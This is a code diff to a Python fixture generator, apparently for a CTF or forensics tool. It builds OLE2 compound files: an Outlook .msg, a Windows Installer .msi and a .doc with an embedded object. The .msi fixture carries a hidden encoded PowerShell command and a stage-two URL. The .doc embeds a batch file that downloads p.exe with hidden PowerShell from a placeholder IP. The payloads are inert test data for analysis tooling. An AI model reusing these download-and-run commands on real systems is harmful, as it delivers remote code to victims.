@@ -2171,6 +2171,319 @@ def write_archive_fixtures() -> None:
     write("archive_docker_image.tar", docker_image_tar())
 
 
+# ---------------------------------------------------------------------------
+# Compound-file formats that are not documents (lot F): Outlook .msg, Windows
+# Installer .msi, and a .doc carrying an embedded object.
+#
+# The writer below builds a real OLE2 file, mini stream and all: `7z l` lists
+# these fixtures, and for the .msi it decodes the table names, which is the
+# independent check that our name encoding is right.
+# ---------------------------------------------------------------------------
+
+
+# --- a general OLE2 writer, needed for the .msg / .msi / embedded-object
+# fixtures, whose streams are far smaller than a sector and so have to live in
+# the mini stream. `cfb_write` above predates it and stays as it is.
+SECTOR = 512
+MINI = 64
+MINI_CUTOFF = 4096
+ENDOFCHAIN = 0xFFFFFFFE
+FREESECT = 0xFFFFFFFF
+FATSECT = 0xFFFFFFFD
+NOSTREAM = 0xFFFFFFFF
+
+
+class Node:
+    def __init__(self, name: str, kind: int, payload: bytes = b"") -> None:
+        self.name = name
+        self.kind = kind  # 1 storage, 2 stream, 5 root
+        self.payload = payload
+        self.children: list[Node] = []
+        self.index = 0
+        self.start = ENDOFCHAIN
+        self.size = len(payload)
+
+
+def _build_tree(entries: list[tuple[str, bytes]]) -> Node:
+    root = Node("Root Entry", 5)
+    for path, payload in entries:
+        parts = path.split("/")
+        current = root
+        for part in parts[:-1]:
+            existing = next((c for c in current.children if c.name == part and c.kind == 1), None)
+            if existing is None:
+                existing = Node(part, 1)
+                current.children.append(existing)
+            current = existing
+        current.children.append(Node(parts[-1], 2, payload))
+    return root
+
+
+def _flatten(root: Node) -> list[Node]:
+    """Directory entries in file order: root first, then every node."""
+    order = [root]
+    queue = [root]
+    while queue:
+        node = queue.pop(0)
+        for child in node.children:
+            order.append(child)
+            queue.append(child)
+    for position, node in enumerate(order):
+        node.index = position
+    return order
+
+
+def cfb_write_tree(entries: list[tuple[str, bytes]]) -> bytes:
+    """Build a compound file holding `entries` ("Storage/name", bytes)."""
+    root = _build_tree(entries)
+    order = _flatten(root)
+    streams = [node for node in order if node.kind == 2]
+
+    # --- the mini stream: every stream under the cutoff, each padded to 64 bytes
+    mini_payload = bytearray()
+    mini_fat: list[int] = []
+    for node in streams:
+        if node.size >= MINI_CUTOFF or node.size == 0:
+            continue
+        node.start = len(mini_payload) // MINI
+        chunk = node.payload + b"\x00" * (-node.size % MINI)
+        count = len(chunk) // MINI
+        for step in range(count):
+            mini_fat.append(ENDOFCHAIN if step == count - 1 else node.start + step + 1)
+        mini_payload += chunk
+    mini_stream = bytes(mini_payload)
+
+    # --- sector layout: FAT, directory, mini FAT, mini stream, then big streams
+    big = [node for node in streams if node.size >= MINI_CUTOFF]
+    directory_sectors = max(1, -(-len(order) * 128 // SECTOR))
+    mini_fat_sectors = -(-len(mini_fat) * 4 // SECTOR) if mini_fat else 0
+    mini_stream_sectors = -(-len(mini_stream) // SECTOR) if mini_stream else 0
+    big_sectors = [(-(-node.size // SECTOR)) for node in big]
+    total_sectors = directory_sectors + mini_fat_sectors + mini_stream_sectors + sum(big_sectors)
+    # The FAT must also describe its own sectors.
+    fat_sectors = 1
+    while (total_sectors + fat_sectors) * 4 > fat_sectors * SECTOR:
+        fat_sectors += 1
+
+    fat: list[int] = []
+    body: list[bytes] = []
+    next_free = 0
+
+    def allocate(data: bytes, count: int) -> int:
+        """Put `data` in `count` consecutive sectors, chain them, return the first."""
+        nonlocal next_free
+        first = next_free
+        padded = data + b"\x00" * (count * SECTOR - len(data))
+        for step in range(count):
+            body.append(padded[step * SECTOR : (step + 1) * SECTOR])
+            fat.append(ENDOFCHAIN if step == count - 1 else first + step + 1)
+        next_free += count
+        return first
+
+    # The FAT sectors come first and describe themselves.
+    for _ in range(fat_sectors):
+        body.append(b"")  # placeholder, filled in at the end
+        fat.append(FATSECT)
+    next_free = fat_sectors
+
+    directory = b"".join(_entry_bytes(node, order) for node in order)
+    directory_start = allocate(directory, directory_sectors)
+    mini_fat_start = (
+        allocate(b"".join(value.to_bytes(4, "little") for value in mini_fat), mini_fat_sectors)
+        if mini_fat_sectors
+        else ENDOFCHAIN
+    )
+    root.start = allocate(mini_stream, mini_stream_sectors) if mini_stream_sectors else ENDOFCHAIN
+    root.size = len(mini_stream)
+    for node, count in zip(big, big_sectors, strict=True):
+        node.start = allocate(node.payload, count)
+
+    # Rebuild the directory now that every start sector is known.
+    directory = b"".join(_entry_bytes(node, order) for node in order)
+    padded = directory + b"\x00" * (directory_sectors * SECTOR - len(directory))
+    for step in range(directory_sectors):
+        body[directory_start + step] = padded[step * SECTOR : (step + 1) * SECTOR]
+
+    while len(fat) % (SECTOR // 4):
+        fat.append(FREESECT)
+    fat_bytes = b"".join(value.to_bytes(4, "little") for value in fat)
+    for index in range(fat_sectors):
+        body[index] = fat_bytes[index * SECTOR : (index + 1) * SECTOR].ljust(SECTOR, b"\xff")
+
+    header = bytearray(512)
+    header[0:8] = bytes.fromhex("d0cf11e0a1b11ae1")
+    header[24:26] = (0x3E).to_bytes(2, "little")
+    header[26:28] = (3).to_bytes(2, "little")
+    header[28:30] = (0xFFFE).to_bytes(2, "little")
+    header[30:32] = (9).to_bytes(2, "little")
+    header[32:34] = (6).to_bytes(2, "little")
+    header[44:48] = fat_sectors.to_bytes(4, "little")
+    header[48:52] = directory_start.to_bytes(4, "little")
+    header[56:60] = MINI_CUTOFF.to_bytes(4, "little")
+    header[60:64] = (mini_fat_start if mini_fat_sectors else ENDOFCHAIN).to_bytes(4, "little")
+    header[64:68] = mini_fat_sectors.to_bytes(4, "little")
+    header[68:72] = ENDOFCHAIN.to_bytes(4, "little")
+    header[72:76] = (0).to_bytes(4, "little")
+    difat = [FREESECT] * 109
+    for index in range(min(fat_sectors, 109)):
+        difat[index] = index
+    header[76:512] = b"".join(value.to_bytes(4, "little") for value in difat)
+    return bytes(header) + b"".join(body)
+
+
+def _entry_bytes(node: Node, order: list[Node]) -> bytes:
+    """One 128-byte directory entry. Children are a right-leaning chain."""
+    raw = bytearray(128)
+    encoded = node.name.encode("utf-16-le")[:62]
+    raw[: len(encoded)] = encoded
+    raw[64:66] = (len(encoded) + 2).to_bytes(2, "little")
+    raw[66] = node.kind
+    raw[67] = 1  # black
+    left = NOSTREAM
+    right = NOSTREAM
+    parent = next((n for n in order if node in n.children), None)
+    if parent is not None:
+        position = parent.children.index(node)
+        if position + 1 < len(parent.children):
+            right = parent.children[position + 1].index
+    child = node.children[0].index if node.children and node.kind in (1, 5) else NOSTREAM
+    raw[68:72] = left.to_bytes(4, "little")
+    raw[72:76] = right.to_bytes(4, "little")
+    raw[76:80] = child.to_bytes(4, "little")
+    raw[116:120] = node.start.to_bytes(4, "little")
+    raw[120:128] = node.size.to_bytes(8, "little")
+    return bytes(raw)
+
+
+def msg_property(tag: int, kind: int = 0x001F) -> str:
+    """A MAPI property stream name: `__substg1.0_` + four hex digits each."""
+    return f"__substg1.0_{tag:04X}{kind:04X}"
+
+
+def outlook_msg() -> bytes:
+    """An Outlook .msg: headers, body, one recipient, one attachment.
+
+    Written from MS-OXMSG: every value is a MAPI property in its own stream,
+    text ones as UTF-16LE (type 001F), the attachment as binary (type 0102).
+    """
+
+    def text(value: str) -> bytes:
+        return value.encode("utf-16-le")
+
+    attachment = small_zip("flag.txt", b"CYBN{msg_attachment}")
+    headers = (
+        "Received: from mail.example.org (mail.example.org [203.0.113.7])\r\n"
+        "\tby mx.corp.local with ESMTP id 42; Tue, 3 Nov 2026 09:00:00 +0100\r\n"
+        "From: Alice <alice@example.org>\r\n"
+        "To: Bob <bob@corp.local>\r\n"
+        "Subject: the archive you asked for\r\n"
+        "Message-ID: <20261103@example.org>\r\n"
+    )
+    entries = [
+        (msg_property(0x0037), text("the archive you asked for")),
+        (msg_property(0x0C1A), text("Alice")),
+        (msg_property(0x0C1F), text("alice@example.org")),
+        (msg_property(0x0E04), text("Bob <bob@corp.local>")),
+        (msg_property(0x001A), text("IPM.Note")),
+        (msg_property(0x1000), text("Hi Bob,\r\nthe password is CYBN{msg_body}.\r\nAlice\r\n")),
+        (msg_property(0x007D), text(headers)),
+        (f"__recip_version1.0_#00000000/{msg_property(0x3001)}", text("Bob")),
+        (f"__recip_version1.0_#00000000/{msg_property(0x39FE)}", text("bob@corp.local")),
+        (f"__attach_version1.0_#00000000/{msg_property(0x3707)}", text("secret.zip")),
+        (f"__attach_version1.0_#00000000/{msg_property(0x370E)}", text("application/zip")),
+        (f"__attach_version1.0_#00000000/{msg_property(0x3701, 0x0102)}", attachment),
+    ]
+    return cfb_write_tree(entries)
+
+
+def installer_msi() -> bytes:
+    """A Windows Installer package: string pool, tables, embedded cabinet.
+
+    The stream names go through the MSI encoding (`ctfc/core/msi.py` has the
+    alphabet and its inverse), the string pool is a (length, refcount) pair per
+    string with the code page in the first pair, and the payload is a cabinet
+    stored as one more stream - exactly how a real .msi carries it.
+    """
+    from ctfc.core.msi import encode_name
+
+    command = "Write-Host 'CYBN{msi_encoded_command}'"
+    encoded = base64.b64encode(command.encode("utf-16-le")).decode()
+    strings = [
+        "INSTALLDIR",
+        "ProductName",
+        "ctfc demo installer",
+        "RunHidden",
+        f"powershell.exe -nop -w hidden -enc {encoded}",
+        "http://203.0.113.9/stage2.ps1",
+        "payload.exe",
+        "CYBN{msi_string_pool}",
+    ]
+    data = "".join(strings).encode()
+    pool = struct.pack("<HH", 1252, 0)  # the code page lives in the first pair
+    for value in strings:
+        pool += struct.pack("<HH", len(value.encode()), 1)
+    cabinet = cab_write([("payload.exe", b"MZ\x90\x00 CYBN{msi_cabinet}\n")], "stored")
+    entries = [
+        (encode_name("_StringData"), data),
+        (encode_name("_StringPool"), pool),
+        (encode_name("_Tables"), "".join(strings[:4]).encode("utf-16-le")),
+        (encode_name("CustomAction"), bytes([1, 0, 2, 0])),
+        (encode_name("Property"), bytes([3, 0])),
+        (encode_name("Binary.payload"), b"MZ" + bytes(200)),
+        ("#_disk1.cab", cabinet),
+        ("\x05SummaryInformation", bytes(96)),
+    ]
+    return cfb_write_tree(entries)
+
+
+def ole10native(name: str, source_path: str, payload: bytes) -> bytes:
+    """An `\x01Ole10Native` stream: the names, then the embedded file itself."""
+    label = name.encode("cp1252") + b"\x00"
+    source = source_path.encode("cp1252") + b"\x00"
+    temp = b"C:\\Users\\author\\AppData\\Local\\Temp\\" + name.encode("cp1252") + b"\x00"
+    body = (
+        struct.pack("<H", 2)
+        + label
+        + source
+        + struct.pack("<II", 0, 0)
+        + temp
+        + struct.pack("<I", len(payload))
+        + payload
+    )
+    return struct.pack("<I", len(body)) + body
+
+
+def document_with_embedded_object() -> bytes:
+    """A .doc whose real payload is an embedded object, not a macro.
+
+    `ObjectPool/_1234567890/\x01Ole10Native` is where Word puts a file that was
+    dragged into the document. The file is still there, with the path it came
+    from on the author's machine.
+    """
+    payload = (
+        b"@echo off\r\n"
+        b"rem CYBN{embedded_object}\r\n"
+        b'powershell -nop -w hidden -c "iwr http://203.0.113.9/p.exe -OutFile %TEMP%\\p.exe"\r\n'
+    )
+    entries = [
+        ("WordDocument", b"\xec\xa5\xc1\x00" + bytes(600)),
+        ("1Table", bytes(300)),
+        (
+            "ObjectPool/_1234567890/\x01Ole10Native",
+            ole10native("update.bat", r"C:\Users\author\Desktop\update.bat", payload),
+        ),
+        ("ObjectPool/_1234567890/\x01CompObj", bytes(76)),
+    ]
+    return cfb_write_tree(entries)
+
+
+def write_compound_fixtures() -> None:
+    """Outlook .msg, Windows Installer .msi, and a .doc with an embedded object."""
+    write("compound_message.msg", outlook_msg())
+    write("compound_installer.msi", installer_msi())
+    write("compound_embedded.doc", document_with_embedded_object())
+
+
 def main() -> None:
     FIXTURES.mkdir(exist_ok=True)
     print(f"writing fixtures to {FIXTURES}")
@@ -2355,6 +2668,9 @@ def main() -> None:
 
     # --- lot F: the archives that are not ZIPs, and a saved Docker image ---
     write_archive_fixtures()
+
+    # --- lot F: the compound files that are not documents ---
+    write_compound_fixtures()
 
 
 if __name__ == "__main__":
